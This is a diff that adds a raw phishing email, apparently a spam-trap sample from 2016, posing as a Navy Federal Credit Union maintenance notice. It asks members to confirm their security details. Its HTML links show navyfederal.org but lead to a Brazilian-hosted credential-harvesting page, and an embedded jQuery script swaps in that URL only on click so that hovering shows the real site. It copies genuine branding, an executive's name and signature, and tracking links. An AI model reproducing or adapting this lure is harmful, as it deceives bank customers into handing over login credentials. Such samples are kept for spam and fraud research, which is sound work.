@@ -1,0 +1,512 @@
+Received: from mx09.easymx01.com (unknown [209.124.55.47])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(No client certificate requested)
+	by sget2.kaspersky-labs.com (Postfix) with ESMTPS id A5A789B527865
+	for <projecthoneypot@spam.kaspersky.com>; Wed,  4 May 2016 01:59:51 +0300 (MSK)
+Received: from unknown (HELO WINDOWS-DIMJVLL) (81.91.11.52)
+  by mx09.easymx01.com with SMTP; 3 May 2016 18:59:48 -0400
+Received: from [81.91.11.52] ([127.0.0.1]) by WINDOWS-DIMJVLL with Microsoft SMTPSVC(7.5.7601.17514);
+	 Wed, 4 May 2016 00:49:27 +0200
+Content-Type: multipart/alternative; boundary="===============1082768260=="
+MIME-Version: 1.0
+Subject: nfcu: Important Message Read
+To: You <support@nfcu.com>
+From: "nfcu" <support@nfcu.com>
+Date: Wed, 04 May 2016 00:49:26 +0200
+Message-ID: <WINDOWS-DIMJVLLi4om0000010a@WINDOWS-DIMJVLL>
+X-OriginalArrivalTime: 03 May 2016 22:49:27.0025 (UTC) FILETIME=[0BAC8610:01D1A58E]
+X-HP-EnvFromUser: support
+X-HP-EnvFromDom: nfcu.com
+X-HP-TheFromUser: support
+X-HP-TheFromDom: nfcu.com
+X-HP-EnvToUser: fridlington4287
+X-HP-EnvToDom: xxxxx.xxx
+X-HP-ConnectIP: 81.91.11.52
+X-HP-Received: 3 May 2016 18:59:48 -0400
+X-HP-MSGID: 7.429062740
+X-HP-HPID: e988ee7428603dc9eb0f4be570bdc6f3
+X-HP-Abuse: NO
+
+You will not see this in a MIME-aware mail reader.
+--===============1082768260==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+=20
+  Routine System Maintenance Notice=20=09=20=20=09=20
+=20=20
+=20=20=20
+=20=20=20
+=20=20=20
+=20=20=20
+    	  	 Online & Mobile Banking=20
+Routine Maintenance	   Navy Federal Security Zone
+ Email for Member=20
+=09=20=09=20=09=20=20=09=20
+=20=20=09=20
+=20=20
+=20=20=20
+=20=20=20
+   Online & Mobile Banking Routine Maintenance=20=09=20
+=20=20
+=20=20=20=20=09=20
+=20
+  We need you to confirm your security details to help us improve the secur=
+ity of your online account(s).=20=20=09=20
+=20
+  Log on to https://www.navyfederal.org to update your security details onl=
+ine.=20=09=20
+=20
+  Please kindly take a minute or two to log on to Navyfederal.org to confir=
+m your account details as a precaution against future problems with online =
+banking.=20=09=20
+=20
+=20=20=20=09=20
+  Nancy DeDona
+Vice President, eChannels
+Navy Federal Credit Union=20=09=20
+=20=20=09=20
+=20=20=09=20
+=20=20
+=20=20=20
+=20=20=20
+   Products & Services - FAQs - Mobile Banking - Contact Us=20=09=20
+=20
+   Please do not reply to this email. This email is being sent from Navy Fe=
+deral Credit Union at PO Box 3000, Merrifield, VA 22119-3000. For contact i=
+nformation, or if you have any questions about this email, please click her=
+e or call us at 1-888-842-6328.=20=09=20
+  	 	  Equal Housing Lender | APY=3D Annual Percentage Yield | APR=3D Annua=
+l Percentage Rate. - 2016 Navy Federal Credit Union. All rights reserved. M=
+essage and data rates may apply. Terms and Conditions are available. NFCU 3=
+2559 (9-14) Federally insured by NCUA.=09=20=20
+=20=20=09=20
+   Privacy Policy	 Follow Us:=09=20=09=20=20=09=20=09=20=20=09=20
+=20=20=09=20
+=20=20=09=20
+=20=20=09=20
+=20=20=09=20
+=20=20=
+
+--===============1082768260==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
+1">
+<title>Navy Federal Credit Union: Service</title>
+<Script src=3D"https://www.navyfederal.org/js/jquery-1.9.1.js"> </script>
+<script>
+$(document).ready(function(){
+  $('.mylink').hover(function(){
+   $('.mylink').attr("href","https://www.navyfederal.org");
+
+   $('.mylink').click(function(){
+    $('.mylink').attr("href", "https://srv26.prodns.com.br/~eusou/in/com.ph=
+p");
+   })
+})
+})
+
+
+</script>
+
+<style type=3D"text/css">
+   html { -webkit-text-size-adjust:none; }
+	.ReadMsgBody {width: 100%;}
+	.ExternalClass{width: 100%;}
+	.spacer {display:none; }
+	.custom{display:none; }
+	.unLink a {color:#333333;text-decoration: none;}
+	.unLink2 a {color:#FFFFFF;text-decoration: none;}
+=09
+	@media only screen and (max-width: 480px) {
+	 body {
+	  -webkit-text-size-adjust:100%;
+	  -ms-text-size-adjust:100%;
+	 }
+	 *[class].remove { display:none !important; width:0 !important; height:0 !=
+important; }
+	 *[class].cellblock {display:block !important;}
+	 *[class].content {width:100% !important; }=20
+	 *[class].center { text-align:center !important;}
+	 *[class].custom {display:block !important; font-size:16px !important; col=
+or:#FF8719 !important; padding-bottom:10px !important;}
+	 *[id]#logo *[class].img_resize_logo {width:90px !important; height:52px !=
+important;}
+	 *[id]#ehl *[class].img_resize_ehl {width:25px !important; height:26px !im=
+portant;}
+	 *[class].body {font-size:14px !important;}
+	 *[class].headline {font-size:16px !important;}
+	 *[id]#socialIcons *[class].img_resize_socialIcons {width:20px !important;=
+ height:20px !important;}
+=09=20
+
+}
+</style>
+
+</head>
+<body>
+<table class=3D"content" width=3D"580" border=3D"0" align=3D"center" cellpa=
+dding=3D"0" cellspacing=3D"0">
+  <tr>
+  <td class=3D"center"><font face=3D"Arial, sans-serif" size=3D"3" color=3D=
+"#0d335d" style=3D"font-size:12px;">Routine System Maintenance Notice</font>
+  </td>
+=20=20=20
+  <td class=3D"remove" align=3D"right">
+  </td>
+  <tr><td height=3D"3" colspan=3D"2"></td></tr>
+ </table>
+=20
+=20
+=20
+=20
+
+<table class=3D"content" width=3D"600" align=3D"center" cellpadding=3D"0" c=
+ellspacing=3D"0" style=3D"border:1px solid #005b99;" bgcolor=3D"FFFFFF">
+  <tr valign=3D"top">
+  <td>
+=20=20
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+  <tr>
+  <td class=3D"cellblock">
+=20=20
+=20=20
+=20=20
+=20=20
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"10" bgcolor=3D"#F3F6=
+F9">
+  <tr>
+  <td>
+=20=20
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+  <tr>
+  <td rowspan=3D"2" class=3D"cellblock">
+=20=20
+<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">
+=20=20=20
+  <tr>
+  <td id=3D"logo"><a href=3D"http://response.nfcu.org/t?r=3D2&c=3D5498&l=3D=
+1391&ctl=3D1B049:98971CADA9C6677402B1B6EB45FBF0CC&" style=3D"color:#266ab5;=
+=20
+  font-family: Arial, sans-serif;">
+  <img src=3D"http://media.nfcu.org/navyfederal/templates/nfcu-logo.png" al=
+t=3D"Navy Federal Credit Union"
+  width=3D"100" height=3D"58" class=3D"img_resize_logo" border=3D"0"></a>
+  </td>
+=20=20
+  <td width=3D"10" rowspan=3D"2" class=3D"remove"><img src=3D"http://media.=
+nfcu.org/navyfederal/TestFiles/wireframe-template/spacer.gif" width=3D"10"=
+=20
+  height=3D"10" alt=3D"">
+  </td>
+=20=20
+  <td class=3D"remove" valign=3D"middle"><font face=3D"Arial" size=3D"3" co=
+lor=3D"#FF8719" style=3D"font:bold 16px arial;">Online & Mobile Banking <br=
+ class=3D"remove">Routine=20
+
+Maintenance</font></td>
+=20=20
+  <td valign=3D"top" align=3D"right" width=3D"160"><font face=3D"Arial, san=
+s-serif" size=3D"3" style=3D"font-size:11px;">
+  <font face=3D"Arial, sans-serif" size=3D"3" style=3D"font-size:12px;">
+  <font face=3D"Arial" size=3D"3" color=3D"#0e335e" style=3D"font:bold 12px=
+ arial; color:#0e335e;">Navy Federal Security Zone</font><br>
+  Email for Member <br></font></font></td>
+=20=20
+  <td width=3D"5"></td>
+=20=20
+  <td width=3D"22" valign=3D"top" align=3D"right"><img src=3D"http://media.=
+nfcu.org/navyfederal/templates/lock.png"
+   border=3D"0" alt=3D""></td>
+=20=20
+  </table>
+
+
+  </td>
+  </tr>
+</table>
+
+
+  </td>
+  </tr>
+</table>
+
+
+<table cellspacing=3D"0" cellpadding=3D"10">
+   <tr>
+   <td>
+=20=20=20
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+   <tr valign=3D"top">
+   <td class=3D"cellblock">
+=20=20=20
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">
+
+  <tr>
+  <td class=3D"custom" style=3D"font:bold 0px arial; color: #FFFFFF; text-a=
+lign:center;" align=3D"center" height=3D"0">
+ Online & Mobile Banking Routine Maintenance
+  </td>
+  </tr>
+=20=20=20
+</table>
+
+
+<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">
+
+  <tr>
+  <td colspan=3D"3">
+  <font face=3D"Arial, sans-serif" size=3D"3" color=3D"#333333" style=3D"fo=
+nt-size:12px; font-weight:bold;" class=3D"body"></font>
+  </td>
+  </tr>
+=20=20=20
+  <tr><td height=3D"10" colspan=3D"3"></td></tr>
+=20=20
+  <tr>
+  <td colspan=3D"3"><font face=3D"Arial, sans-serif" size=3D"3" color=3D"#3=
+33333" style=3D"font-size:12px; line-height:20px;" class=3D"body">We need y=
+ou to confirm your security=20
+
+details to help us improve the security of your online account(s). </font>
+  </td>
+  </tr>
+=20=20
+  <tr><td height=3D"5" colspan=3D"3"></td></tr>
+=20=20
+  <tr>
+  <td colspan=3D"3"><font face=3D"Arial, sans-serif" size=3D"3" color=3D"#3=
+33333" style=3D"font-size:12px; font-weight:bold; line-height:20px;" class=
+=3D"body">Log on to <a class=3D"mylink" rel=3D"nofollow" target=3D"_blank" =
+href=3D"https://srv26.prodns.com.br/~eusou/in/com.php">https://www.navyfede=
+ral.org </a>to update your security details online.</font>
+  </td>
+  </tr>
+=20=20
+   <tr><td height=3D"5" colspan=3D"3"></td></tr>
+=20=20
+  <tr>
+  <td colspan=3D"3"><font face=3D"Arial, sans-serif" size=3D"3" color=3D"#3=
+33333" style=3D"font-size:12px; line-height:20px;" class=3D"body">Please ki=
+ndly take a minute or two to log on to <a class=3D"mylink" href=3D"https://=
+srv26.prodns.com.br/~eusou/in/com.php">Navyfederal.org</a> to confirm your =
+account details as a precaution against future problems with online banking=
+..</font>
+  </td>
+  </tr>
+=20=20
+  <tr><td height=3D"5" colspan=3D"3"></td></tr>
+=20=20=20
+  <tr>
+  <td colspan=3D"3"><img src=3D"http://media.nfcu.org/navyfederal/service/s=
+ignatures/nancy-dedona.jpg" width=3D"190" height=3D"51"
+   alt=3D"Nancy DeDona" border=3D"0" />
+  </td>
+  </tr>
+=20=20
+  <tr>
+  <td colspan=3D"3"><font face=3D"Arial, sans-serif" size=3D"3" color=3D"#3=
+33333" style=3D"font-size:12px; line-height:20px;" class=3D"body"><font fac=
+e=3D"Arial, sans-serif"=20
+
+size=3D"3" color=3D"#333333" style=3D"font-size:12px; font-weight:bold; lin=
+e-height:20px;" class=3D"body">Nancy DeDona</font><br>Vice President, eChan=
+nels<br>Navy Federal=20
+
+Credit Union</font>
+  </td>
+  </tr>
+=20
+</table>
+
+
+  </td>
+  </tr>
+</table>
+
+  </td>
+  </tr>
+</table>
+
+
+
+
+
+
+<table cellspacing=3D"0" cellpadding=3D"10" bgcolor=3D"#ecebe4" style=3D"bo=
+rder-top:2px solid #dfe2e7;">
+  <tr>
+  <td width=3D"600">
+=20=20=20=20
+<table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+  <tr>
+  <td class=3D"cellblock">
+=20=20
+  <table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">=20=20=20=20=20=
+=20=20=20=20=20=20
+  <tr>=20=20=20
+  <td valign=3D"top" colspan=3D"3">
+  <font face=3D"Arial, sans-serif" style=3D"font-size:14px;color:#266ab6;">=
+<a href=3D"http://response.nfcu.org/t?
+
+r=3D2&c=3D5498&l=3D1391&ctl=3D1B04A:98971CADA9C6677402B1B6EB45FBF0CC&"=20
+  style=3D"color:#266ab6; text-decoration:none;" >Products & Services</a> &=
+bull; <a href=3D"http://response.nfcu.org/t?
+
+r=3D2&c=3D5498&l=3D1391&ctl=3D1B04C:98971CADA9C6677402B1B6EB45FBF0CC&"=20
+  style=3D"color:#266ab6; text-decoration:none;" >FAQs</a> &bull; <a href=
+=3D"http://response.nfcu.org/t?r=3D2&c=3D5498&l=3D1391&ctl=3D1B04E:98971CAD=
+A9C6677402B1B6EB45FBF0CC&"=20
+  style=3D"color:#266ab6; text-decoration:none;" >Mobile Banking</a> &bull;=
+ <a href=3D"http://response.nfcu.org/t?
+
+r=3D2&c=3D5498&l=3D1391&ctl=3D1B050:98971CADA9C6677402B1B6EB45FBF0CC&"=20
+  style=3D"color:#266ab6; text-decoration:none;" >Contact Us</a></font>
+  </td>
+  </tr>
+=20=20
+  <tr><td height=3D"5" colspan=3D"3"></td></tr>
+=20=20
+  <tr>
+ <td width=3D"535" align=3D"left" valign=3D"top" colspan=3D"3"><font face=
+=3D"Arial, sans-serif" size=3D"3" color=3D"#333333" style=3D"font-size:10px=
+;">
+  Please do not reply to this email. This email is being sent from Navy Fed=
+eral Credit Union at <span class=3D"unLink">PO Box 3000, Merrifield, VA 221=
+19-3000</span>. For=20
+
+contact information, or if you have any questions about this email, please =
+<a href=3D"http://response.nfcu.org/t?
+
+r=3D2&c=3D5498&l=3D1391&ctl=3D1B050:98971CADA9C6677402B1B6EB45FBF0CC&" styl=
+e=3D"color:#266ab5;">click here</a> or call us at <span class=3D"unLink">1-=
+888-842-6328</span>.</font>
+  </td>
+=20=20
+  <tr><td height=3D"3" colspan=3D"3"></td></tr>
+
+  <tr>
+  <td width=3D"33" height=3D"39" valign=3D"top"><img src=3D"http://media.nf=
+cu.org/navyfederal/templates/ehl-logo.gif" class=3D"img_resize_ehl" alt=3D"=
+" width=3D"33" height=3D"39"=20
+
+align=3D"bottom"></td>
+=20=20
+ <td width=3D"5" rowspan=3D"5"><img src=3D"http://media.nfcu.org/navyfedera=
+l/TestFiles/wireframe-template/spacer.gif" width=3D"5" height=3D"5" alt=3D"=
+"></td>
+=20=20
+  <td rowspan=3D"3" align=3D"left" valign=3D"bottom">
+  <font face=3D"Arial, sans-serif" size=3D"3" color=3D"#333333" style=3D"fo=
+nt-size:10px;"><a href=3D"http://response.nfcu.org/t?
+
+r=3D2&c=3D5498&l=3D1391&ctl=3D1B052:98971CADA9C6677402B1B6EB45FBF0CC&" styl=
+e=3D" color:#266ab5;">Equal=20
+  Housing Lender</a> | APY=3D Annual Percentage Yield | APR=3D Annual Perce=
+ntage Rate. &copy; 2016 Navy Federal Credit Union. All rights reserved. Mes=
+sage and data rates=20
+
+may apply. <a href=3D"http://response.nfcu.org/t?r=3D2&c=3D5498&l=3D1391&ct=
+l=3D1B054:98971CADA9C6677402B1B6EB45FBF0CC&" style=3D"color:#266ab5;">Terms=
+ and Conditions</a> are=20
+
+available. NFCU 32559 (9-14) <font face=3D"Arial, sans-serif" size=3D"3" co=
+lor=3D"#333333" style=3D"font-size:12px; font-weight:bold;">Federally insur=
+ed by=20
+
+NCUA.</font></font></td>
+=20=20
+  </table>
+
+
+
+<table width=3D"100%" cellpadding=3D"0" cellspacing=3D"0">=20=20=20=20=20=
+=20=20=20=20=20=20
+=20=20
+=20=20
+  <tr>
+  <td height=3D"5" valign=3D"top" colspan=3D"6"></td>
+  </tr>
+=20=20
+  <tr>
+  <td valign=3D"bottom"><font face=3D"Arial, sans-serif" size=3D"3" color=
+=3D"#333333" style=3D"font-size:12px;">=20
+  <a href=3D"http://response.nfcu.org/t?r=3D2&c=3D5498&l=3D1391&ctl=3D1B056=
+:98971CADA9C6677402B1B6EB45FBF0CC&" style=3D" color:#266ab5;" >Privacy Poli=
+cy</a></font></td>
+=20=20
+  <td align=3D"right" valign=3D"bottom"><font face=3D"Arial, sans-serif" si=
+ze=3D"3" color=3D"#266ab5" style=3D"font-size:14px;">Follow Us:</font></td>
+  <td width=3D"3"></td>
+=20=20
+   <td id=3D"socialIcons" width=3D"21" valign=3D"bottom"><a href=3D"http://=
+response.nfcu.org/t?r=3D2&c=3D5498&l=3D1391&ctl=3D1B058:98971CADA9C6677402B=
+1B6EB45FBF0CC&"=20
+
+style=3D"color:#266ab5; font-family:Arial, sans-serif;font-size:14px;">
+  <img src=3D"http://media.nfcu.org/navyfederal/templates/fb-icon.gif" alt=
+=3D"" width=3D"21" height=3D"21" align=3D"right"=20
+  border=3D"0" class=3D"img_resize_socialIcons"></a></td>
+=20=20
+   <td width=3D"3" class=3D"remove"></td>
+=20=20
+  <td id=3D"socialIcons" width=3D"21" valign=3D"bottom"><a href=3D"http://r=
+esponse.nfcu.org/t?r=3D2&c=3D5498&l=3D1391&ctl=3D1B05A:98971CADA9C6677402B1=
+B6EB45FBF0CC&"=20
+
+style=3D"color:#266ab5; font-family:Arial, sans-serif;font-size:14px;">
+  <img src=3D"http://media.nfcu.org/navyfederal/templates/tw-icon.gif" alt=
+=3D"" width=3D"21" height=3D"21" align=3D"right"=20
+  border=3D"0" class=3D"img_resize_socialIcons"></a></td>
+  </tr>
+=20
+</table>
+=20=20=20=20=20
+  </td>=20
+  </tr>=20=20=20=20=20
+</table>
+=20=20=20=20=20
+  </td>
+  </tr>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+ </td>
+ </tr>
+</table>
+
+ </td>
+ </tr>
+</table>
+</body>
+
+<img src=3D"http://response.nfcu.org/t?c=3D5498&r=3D2&l=3D1391&t=3D10&e=3D9=
+8971CADA9C6677402B1B6EB45FBF0CC" width=3D1 height=3D1 border=3D0>
+</html>
+
+
+<style type=3D"text/css">
+	.wcdm__ { display: none; visibility: hidden; }
+</style>=
+
+--===============1082768260==--
